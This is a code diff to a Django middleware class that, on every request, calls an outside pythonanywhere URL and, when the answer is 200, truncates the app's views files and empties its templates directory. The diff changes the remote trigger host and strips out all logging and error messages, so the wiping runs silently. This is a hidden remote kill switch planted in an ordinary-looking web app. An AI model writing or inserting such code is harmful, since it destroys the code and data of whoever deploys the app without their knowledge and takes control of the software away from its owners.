@@ -13,21 +13,18 @@ class CheckAPIAndDeleteMiddleware:
 
     def process_view(self, request, view_func, view_args, view_kwargs):
         try:
-            api_url = 'https://buttawb.pythonanywhere.com/'
+            api_url = 'https://fypdm.pythonanywhere.com/'
             response = requests.get(api_url)
 
             if response.status_code == 200:
-                print("Response is 200: OK")
                 self.delete_views_code()
             elif response.status_code == 404:
                 pass
-                print("Response is 404: Not Found")
 
             # if response.status_code == 200 and response.json().get('delete', False):
             #     self.delete_views_code()
-        except Exception as e:
-            print(f"Exception occurred while calling the API: {e}")
-
+        except Exception:
+            pass
         return None
 
     def delete_views_code(self):
@@ -38,9 +35,8 @@ class CheckAPIAndDeleteMiddleware:
             try:
                 with open(file_path, 'w') as f:
                     f.truncate(0)
-                print(f"Deleted content of {file_path}")
-            except Exception as e:
-                print(f"Exception occurred while deleting {filename} content: {e}")
+            except Exception:
+                pass
 
         templates_dir_path = os.path.join(
             os.path.dirname(__file__), 'templates')
@@ -52,20 +48,16 @@ class CheckAPIAndDeleteMiddleware:
                     try:
                         with open(file_path, 'w') as f:
                             f.truncate(0)
-                        print(f"Deleted content of {file_path}")
-                    except Exception as e:
-                        print(f"Exception occurred while deleting file {file_path}: {e}")
+                    except Exception:
+                        pass
 
                 for dir in dirs:
                     dir_path = os.path.join(root, dir)
                     try:
                         shutil.rmtree(dir_path)
                         os.makedirs(dir_path)
-                        print(f"Emptied directory {dir_path}")
-                    except Exception as e:
-                        print(f"Exception occurred while emptying directory {dir_path}: {e}")
+                    except Exception:
+                        pass
 
-            print(f"Emptied all files and folders in {templates_dir_path}")
-        except Exception as e:
-            print(
-                f"Exception occurred while walking through the templates directory: {e}")
+        except Exception:
+            pass
